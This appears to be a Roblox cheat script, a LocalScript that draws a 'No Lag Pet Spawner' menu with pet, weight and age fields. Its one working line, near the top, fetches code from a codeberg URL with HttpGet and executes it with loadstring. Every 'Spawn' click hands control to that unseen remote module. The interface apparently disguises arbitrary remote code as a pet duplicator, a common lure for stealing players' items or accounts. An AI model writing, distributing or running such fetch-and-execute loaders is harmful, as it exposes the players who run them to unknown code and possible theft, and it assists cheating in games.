-- LocalScript in StarterGui
local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player           = Players.LocalPlayer

-- new spawner loader
local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
Spawner.Load()

-- parent ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name   = "DupeSpawnerUI"
gui.Parent = player:WaitForChild("PlayerGui")

-- main window (start hidden for fade-in)
local window = Instance.new("Frame", gui)
window.Name             = "Window"
window.Size             = UDim2.new(0, 360, 0, 0)
window.Position         = UDim2.new(0.5, -180, 0.5, -150)
window.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
window.BorderSizePixel  = 0
window.ClipsDescendants = true
Instance.new("UICorner", window).CornerRadius = UDim.new(0, 8)

local origSize      = UDim2.new(0,360,0,300)
local minimizedSize = UDim2.new(0,360,0,36)
local isMinimized   = false

-- TitleBar (draggable)
local titleBar = Instance.new("Frame", window)
titleBar.Name               = "TitleBar"
titleBar.Size               = UDim2.new(1,0,0,36)
titleBar.Position           = UDim2.new(0,0,0,0)
titleBar.BackgroundColor3   = Color3.fromRGB(35,35,35)
titleBar.BorderSizePixel    = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0,8)
titleBar.ZIndex = 2

local title = Instance.new("TextLabel", titleBar)
title.Name                   = "Title"
title.Text                   = "No Lag Pet Spawner V1.2"
title.Font                   = Enum.Font.SourceSansBold
title.TextSize               = 18
title.TextColor3             = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.AnchorPoint            = Vector2.new(0.5,0.5)
title.Position               = UDim2.new(0.5,0,0.5,0)
title.Size                   = UDim2.new(1,-80,1,0)
title.TextXAlignment         = Enum.TextXAlignment.Center
title.TextYAlignment         = Enum.TextYAlignment.Center
title.ZIndex = 2

local minBtn = Instance.new("TextButton", titleBar)
minBtn.Name                   = "Minimize"
minBtn.Text                   = "—"
minBtn.Font                   = Enum.Font.SourceSansBold
minBtn.TextSize               = 20
minBtn.TextColor3             = Color3.new(1,1,1)
minBtn.BackgroundTransparency = 1
minBtn.Size                   = UDim2.new(0,36,0,36)
minBtn.Position               = UDim2.new(1,-40,0,0)
minBtn.ZIndex                 = 2

-- drag logic
do
    local dragging, dragStart, startPos
    titleBar.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = inp.Position
            startPos  = window.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    titleBar.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement then
            if dragging then
                local delta = inp.Position - dragStart
                window.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + delta.X,
                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
                )
            end
        end
    end)
end

-- Pet tab
local tabBar = Instance.new("Frame", window)
tabBar.Name                   = "TabBar"
tabBar.Size                   = UDim2.new(1,-16,0,32)
tabBar.Position               = UDim2.new(0,8,0,44)
tabBar.BackgroundTransparency = 1
tabBar.ZIndex                 = 1
local petBtn = Instance.new("TextButton", tabBar)
petBtn.Name             = "PetTab"
petBtn.Text             = "Pet Spawner"
petBtn.Font             = Enum.Font.SourceSans
petBtn.TextSize         = 16
petBtn.TextColor3       = Color3.new(1,1,1)
petBtn.BackgroundColor3 = Color3.fromRGB(35,35,35)
petBtn.BorderSizePixel  = 0
petBtn.Size             = UDim2.new(1,0,1,0)
Instance.new("UICorner", petBtn).CornerRadius = UDim.new(0,6)

-- container
local content = Instance.new("Frame", window)
content.Name             = "PetContent"
content.Size             = UDim2.new(1,-16,1,-100)
content.Position         = UDim2.new(0,8,0,84)
content.BackgroundColor3 = Color3.fromRGB(30,30,30)
Instance.new("UICorner", content).CornerRadius = UDim.new(0,6)
content.ZIndex           = 1
local uiList = Instance.new("UIListLayout", content)
uiList.Padding             = UDim.new(0,8)
uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiList.VerticalAlignment   = Enum.VerticalAlignment.Top
uiList.SortOrder           = Enum.SortOrder.LayoutOrder

-- Pet dropdown
local petList = {"Mimic Octopus","Raccoon","Disco Bee","Dragonfly","Queen Bee","Red Fox","Seal"}
local df = Instance.new("Frame", content)
df.Size, df.BackgroundTransparency = UDim2.new(1,-20,0,36), 1
df.ZIndex = 2
local lbl = Instance.new("TextLabel", df)
lbl.Text, lbl.Font, lbl.TextSize = "Pet Name:", Enum.Font.SourceSans, 14
lbl.TextColor3, lbl.BackgroundTransparency = Color3.new(1,1,1), 1
lbl.Size, lbl.ZIndex = UDim2.new(0.4,0,1,0), 2
local dropBtn = Instance.new("TextButton", df)
dropBtn.Text, dropBtn.Font, dropBtn.TextSize = petList[1], Enum.Font.SourceSans, 14
dropBtn.TextColor3, dropBtn.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(45,45,45)
dropBtn.BorderSizePixel, dropBtn.Size = 0, UDim2.new(0.55,0,1,0)
dropBtn.Position, dropBtn.ZIndex = UDim2.new(0.45,0,0,0), 2
Instance.new("UICorner", dropBtn).CornerRadius = UDim.new(0,4)
local opts = Instance.new("Frame", df)
opts.Visible, opts.BackgroundColor3 = false, Color3.fromRGB(45,45,45)
opts.BorderSizePixel, opts.Position = 0, UDim2.new(0.45,0,1,2)
opts.Size, opts.ZIndex = UDim2.new(0.55,0,0,#petList*36), 2
Instance.new("UICorner", opts).CornerRadius = UDim.new(0,4)
local optsLayout = Instance.new("UIListLayout", opts)
optsLayout.SortOrder, optsLayout.Padding = Enum.SortOrder.LayoutOrder, UDim.new(0,2)
for i,v in ipairs(petList) do
    local e = Instance.new("TextButton", opts)
    e.Text, e.Font, e.TextSize = v, Enum.Font.SourceSans, 14
    e.TextColor3, e.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(55,55,55)
    e.BorderSizePixel, e.Size, e.LayoutOrder = 0, UDim2.new(1,0,0,36), i
    Instance.new("UICorner", e).CornerRadius = UDim.new(0,4)
    e.ZIndex = 2
    e.MouseButton1Click:Connect(function()
        dropBtn.Text = v
        opts.Visible = false
    end)
end
dropBtn.MouseButton1Click:Connect(function() opts.Visible = not opts.Visible end)

-- numeric fields
local function makeField(labelText, placeholder)
    local f = Instance.new("Frame", content)
    f.Size, f.BackgroundTransparency, f.ZIndex = UDim2.new(1,-20,0,36), 1, 1
    local l = Instance.new("TextLabel", f)
    l.Text, l.Font, l.TextSize = labelText, Enum.Font.SourceSans, 14
    l.TextColor3, l.BackgroundTransparency = Color3.new(1,1,1), 1
    l.Size, l.ZIndex = UDim2.new(0.4,0,1,0), 1
    local b = Instance.new("TextBox", f)
    b.PlaceholderText, b.Text = placeholder or "", ""
    b.Font, b.TextSize, b.TextColor3 = Enum.Font.SourceSans, 14, Color3.new(1,1,1)
    b.BackgroundColor3, b.BorderSizePixel = Color3.fromRGB(45,45,45), 0
    b.Size, b.Position, b.ZIndex = UDim2.new(0.55,0,1,0), UDim2.new(0.45,0,0,0), 1
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    return b
end

local kgBox  = makeField("Weight (KG):", "e.g. 1")
local ageBox = makeField("Age:",         "e.g. 2")

-- Spawn button
local spawnBtn = Instance.new("TextButton", content)
spawnBtn.Text, spawnBtn.Font, spawnBtn.TextSize = "Spawn", Enum.Font.SourceSansBold, 18
spawnBtn.TextColor3, spawnBtn.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(60,60,60)
spawnBtn.BorderSizePixel, spawnBtn.Size = 0, UDim2.new(0.5,0,0,36)
spawnBtn.Position, spawnBtn.ZIndex = UDim2.new(0.25,0,0,0), 1
Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,6)
spawnBtn.MouseButton1Click:Connect(function()
    local pet = dropBtn.Text
    local kg  = tonumber(kgBox.Text)  or 1
    local age = tonumber(ageBox.Text) or 1
    if pet ~= "" then
        Spawner.SpawnPet(pet, kg, age)
    end
end)

-- fade-in
TweenService:Create(window, TweenInfo.new(0.4), {Size = origSize}):Play()

-- fixed minimize
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    tabBar.Visible, content.Visible = not isMinimized, not isMinimized
    local target = isMinimized and minimizedSize or origSize
    TweenService:Create(window, TweenInfo.new(0.25), {Size = target}):Play()
end)
